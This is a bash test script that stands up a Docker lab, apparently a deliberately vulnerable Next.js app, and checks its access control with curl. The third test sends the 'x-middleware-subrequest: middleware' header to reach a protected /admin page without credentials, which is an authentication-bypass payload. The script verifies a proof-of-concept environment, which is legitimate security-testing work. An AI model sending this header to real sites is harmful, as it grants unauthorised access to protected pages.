#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

# 1. /admin without auth returns 401
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:8080/admin")
if [ "$STATUS" = "401" ]; then
  echo "[+] PASS: /admin without auth returns 401"
else
  echo "[-] FAIL: expected 401, got $STATUS"; exit 1
fi

# 2. /admin with valid session cookie returns flag
OUT=$(curl -sf -H "Cookie: session=valid-admin-token" "http://localhost:8080/admin")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: valid session cookie grants access"
else
  echo "[-] FAIL: session cookie did not grant access: $OUT"; exit 1
fi

# 3. /admin with middleware bypass header returns flag (the vulnerability)
OUT=$(curl -sf -H "x-middleware-subrequest: middleware" "http://localhost:8080/admin")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: middleware bypass header captured flag"
else
  echo "[-] FAIL: middleware bypass did not work: $OUT"; exit 1
fi

# 4. / is public
OUT=$(curl -sf "http://localhost:8080/")
if echo "$OUT" | grep -q "NextApp"; then
  echo "[+] PASS: homepage is public"
else
  echo "[-] FAIL: homepage not accessible: $OUT"; exit 1
fi

echo "[+] All tests passed"
